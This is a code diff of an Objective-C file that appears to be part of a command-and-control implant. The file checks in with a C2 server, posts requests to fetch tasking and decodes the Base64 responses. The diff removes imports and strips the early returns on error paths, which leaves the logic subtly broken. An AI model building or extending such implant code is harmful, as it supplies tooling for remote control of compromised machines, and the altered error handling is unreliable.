@@ -1,9 +1,4 @@
-#import <Foundation/Foundation.h>
-#include <complex.h>
-#import "HTTPC2Config.h"
-#import "SystemInfoHelper.h"
 #import "C2CheckIn.h"
-#import "C2Task.h"
 
 /// Track the callback UUID (used for sending agent messages)
 NSString *callbackUUID = nil; 
@@ -159,10 +154,9 @@ NSString *callbackUUID = nil;
 
 #pragma mark - Tasking Method
 
-+ (void)getTasking {
++ (BOOL)getTasking {
     if (callbackUUID == nil) {
         NSLog(@"[ERROR] ❌ No callback UUID available to check for tasking....");
-        return;
     }
     
     /// C2 configuration from the stamped HTTPC2Config
@@ -186,7 +180,6 @@ NSString *callbackUUID = nil;
     [self sendPOSTRequestWithURL:url payload:taskingData headers:headers completion:^(NSData *data, NSURLResponse *response, NSError *error) {
         if (error) {
             NSLog(@"[ERROR] ❌ Error during get_tasking: %@", error.localizedDescription);
-            return;
         }
         
         NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
@@ -195,7 +188,6 @@ NSString *callbackUUID = nil;
             NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
             if (!decodedData) {
                 NSLog(@"[ERROR] ❌ Failed to decode Base64 tasking response.");
-                return;
             }
             
             NSString *decodedString = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
